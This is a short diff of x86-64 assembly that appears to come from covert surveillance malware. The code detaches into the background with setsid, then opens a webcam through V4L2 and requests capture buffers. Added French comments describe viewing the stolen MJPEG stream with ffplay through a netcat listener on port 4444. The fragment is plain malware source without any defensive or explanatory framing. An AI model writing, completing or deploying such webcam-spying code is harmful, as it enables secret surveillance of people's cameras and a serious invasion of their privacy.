@@ -870,6 +870,11 @@ end_:
 		mov		rax, SYS_setsid
 		syscall
 
+
+		; Ici commence la partie pour la cam
+		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
+		; c'est la commande que j'utilise avec
+		; nc -lvnp 4444
 		mov		rax, SYS_open
 		lea		rdi, [rel pathv]
 		mov		rsi, 2
@@ -917,7 +922,7 @@ end_:
 		mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
 		mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
 		xor		eax, eax
-		mov		[reqb + 12], eax  ; reserved = 0
+		mov		[reqb + 12], eax
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_REQBUFS
